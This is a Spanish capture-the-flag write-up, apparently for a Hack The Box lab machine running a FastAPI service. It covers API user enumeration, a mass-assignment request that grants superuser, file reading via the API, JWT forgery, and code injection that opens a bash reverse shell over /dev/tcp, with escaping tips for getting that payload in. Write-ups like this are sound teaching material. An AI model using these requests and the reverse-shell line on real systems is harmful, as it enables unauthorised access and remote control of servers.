---------
- Tags: #lfi #api #API-Enumeration #Abusing-API #mass-assignment-attack #JTW #information-leakage #PAM #pam_wordle
---------------
## Técnicas utilizadas
- API Enumeration  
- Abusing API - Registering a user  
- Accessing the Docs path of FastAPI  
- Mass Assignment Attack (Becoming superusers)  
- Abusing API - Reading system files  
- Information Leakage  
- Forge JWT (Assigning us an extra privilege)  
- Abusing API - Creating a new file to achieve remote command execution (RCE)  
- Abusing pam_wordle (Privilege Escalation)
## Procedimiento

![[Pasted image 20230620184107.png]]

#### Reconocimiento

El escaneo con nmap nos da los siguientes resultados:
```java
# nmap -p22,80 -sCV 10.10.11.162 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 09:14 MST
Nmap scan report for 10.10.11.162
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Fri, 23 Jun 2023 16:11:01 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Fri, 23 Jun 2023 16:10:50 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Fri, 23 Jun 2023 16:10:56 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=6/23%Time=6495C506%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,A6,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Fri,\x2023\x20Jun\x202023
SF:\x2016:10:50\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2022\r\nc
SF:ontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg\
SF:":\"UHC\x20Api\x20v2\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\ndate:\x20Fri,\x2023\x20Jun\x202023\x2016:10:56\
SF:x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncontent-type:\
SF:x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\":\"Method
SF:\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(FourOhFourR
SF:equest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Fri,\x2023\x20J
SF:un\x202023\x2016:11:01\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\
SF:x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20close\r\n\
SF:r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r
SF:(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent
SF:-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nI
SF:nvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestTCP,76,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20
SF:received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:content-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalServerCookie
SF:,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20req
SF:uest\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.03 seconds
```
Si lanzamos un whatweb podemos visualizar las tecnologías que están corriendo por detrás.

``` python
# whatweb 10.10.11.162
http://10.10.11.162 [200 OK] Country[RESERVED][ZZ], HTTPServer[uvicorn], IP[10.10.11.162]
```

-------------
####  API Enumeration 

Podemos tirar de **wfuzz** o **Gobuster** para enumerar la **API**. Si somos pacientes, podemos encontrar la ruta de *docs* y *api*. Si intentamos ingresar el directorio de *docs* podemos darnos cuenta de que nos pide autentificacion:
```json
# curl -s -X GET "http://10.10.11.162/docs" | jq

{
  "detail": "Not authenticated"
}
```

Si visitamos la ruta *api*, podemos ver que nos muestra un *endpoint*. Si visitamos el primer *endpoint* podemos ver que se nos muestran otros dos: *user* y *admin*.
Intentando visitar el *endpoint* de *admin* vemos que no se nos permite el acceso. En el directorio de *user* nos muestra un *404 not found*. podemos intentar fuzzear los directorios que estan disponibles para el usuario *user* y encontramos los siguientes:
![[Pasted image 20230623092659.png]]
Nos detecta numeros. Si intentamos acceder a ellos podremos visualizar informacion de usuarios.
Podemos montarnos un *oneliners* e ir dumpeando todos los usuarios existentes de la siguiente manera:

```java
# for i in $(seq 0 100); do curl -s -X GET "http://10.10.11.162/api/v1/user/$i";done | jq
```

Los usuarios cuentan con un nombre de dominio en la parte de correo. Podemos intentar contemplar en el */etc/hosts* para ver si se esta aplicando *virtualhosting*. 

-----------
#### Abusing API - Registering a user
Ahora que fuzzearmos el directorio de *user* a través de *GET* podemos intentar fuzzear pero ahora a través de *POST* y tenemos el siguient resultado:
![[Pasted image 20230623093143.png]]
Si hacemos un *curl* por el metodo *POST* a signup, vemos que de output nos da esta estructura:
```json
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

----------
#### Accessing the Docs path of FastAPI  

Basicamente, es la estructura que debe llevar nuestro *curl* para intentar registrar un nuevo usuario. No olvidar cambiar el *Content-Type* a *application/json* para que la petición sea valida.

Cabe mencionar que para loguearnos, la data la tenemos que traminar sin formato *json*. Una vez registrado, podemos logearnos para obtener un **JWT**. Si colocamos el **JWT** en **jwt.io** podemos ver la estructura de nuestro **JWT**. 

Ahora que tenemos nuestro **JWT** podemos intentar autenticarnos al *docs* que habiamos encontrado. Lo haremos a través de **BurpSuite** para mayor comidad.

---------
#### Mass Assignment Attack (Becoming superusers)  

Vemos un *endpoint* que nos permite cambiar el campo *profile* de nuestro usuario. Podemos intentar ejecutar un **Mass Assignment** para intentar colocar el *is_superuser* a *true*:

```json
curl -s -X PUT "http://10.10.11.162/api/v1/user/12/edit" -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjg4MjI5MDA1LCJpYXQiOjE2ODc1Mzc4MDUsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjU2ZDQzMWJlLTFkMDEtNDE5Ny1iNjg3LWU1OGVhZTE1MjIyZSJ9.qzUsHsJIH018-bQnWjyzzpKdDzt6p8wZAxhgeX2E9KQ" -H 'Content-Type: application/json' -d '{"profile":"prueba", "is_superuser": true}'
```

------------
#### Abusing API - Reading system files 

Una vez nos autentifiquemos como nuestro nuevo usuario *admin* podremos visualizar archivos. Esto nos sera realmente util ya que ahora podremos intentar encontrar el **secret** para modificar nuestro **JWT** dado que necesitamos un campo más para ser completamente admin: *debug*.
```json
{"detail":"Debug key missing from JWT"}
```
Como estar convertiendo todos los archivos que queremos leer a **base64** es un fastidio, vamos a crear un script que nos lo automatice:

```bash
# Paleta de colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#ctrl + c
trap ctrl_c INT

function ctrl_c(){
	echo -n "\n\n[!] Saliendo..."
	exit 1
}
function helpPanel(){
	echo -n "\n\n[!] Uso:\n"
	echo -n "\tf) Nombre de archivo a leer"
	echo -n "\th) Muestra este panel de ayuda "
	exit 1	
}
function getFilename(){
	filename=$1
	filename_b64="$(echo -n "$filename" | base64 -w 0)"
	<Comando-curl>
}


declare -i parameter_counter=0

while getopts "f:h" arg; do
	case $arg in
		f) filename=$OPTARG; let parameter_counter+=1;;
		h) helpPanel;;
	esac
done

if [ "$parameter_counter" -eq 1 ]; then
	getFilename "$filename"
else
	helpPanel
fi
```

-----------
#### Information Leakage  
Buscando por rutas tipicas, no encontramos nada interesante. Podemos intentar listar procesos que se esten ejecutando en el servidor en el */proc/$number/cmdline*. Antes de enumerar *cmdline* en busca de procesos, podemos intentar listar */proc/self/cmdline* (lista procesos), tambien el */proc/self/stat* (lista el *PID* del proceso) y el */proc/self/environ*.
![[Pasted image 20230623102436.png]]
Podemos dar con la ruta de la aplicación. Si intentamos enumerar el *main.py* podemos encontrar la ruta donde se encuentra una configuración donde se toca el *JWT*. Si visitamos la configuración a la cual hace alución, podemos dar con el **JWT**:
![[Pasted image 20230623102958.png]]

---------
#### Forge JWT (Assigning us an extra privilege) 
Una vez tengamos el secreto, podemos agregar el campo que necesitabamos para poder escribir archivos desde la api.

-------------
#### Abusing API - Creating a new file to achieve remote command execution (RCE) 
Una vez podamos crear archivos, podemos crear una reverse shell con python e intentar insertarlo en la plagina web. Podemos atentar contra los *endpoint*. El problema que vamos a tener, es que tenemos que insertar todo el codigo en un espacio reducido. Podemos intentar usar **cyberchef** para usar *replace*, esto con el fin de escapar: *comillas simples*, *comillas dobles*, *salto de linea*.

Comillas simples intepretadas de otra forma:

```python
if user_id == -123:
	import os; os.system('\''bash -c "bash -i >& /dev/tcp/ip/puerto 0>&1" '\'')
```

Comillas simples:

```
Find = '
Replace = \'\\''
```

Comillas dobles:

```
FIND = "
Replace = \\"
{Simple String}
```

Saltos de linea:

```
FIND = \n
Replace = \\\\n
{Simple String}
```

```
Find = \n
Replace = \\n
{extended (\n, \t, \x)}
```

------------
#### Abusing pam_wordle (Privilege Escalation)

Una vez dentro de la maquina,  podemos encontrar la contraseña del usuario *htb* en un archivo *auth.log*. Si intentamos hacer un *sudo -l* vemos que esta configurado un **pam_wordle**. Basicamente, es un juego del ahorcado que tenemos que ir decifrando con palabras aleatorias.


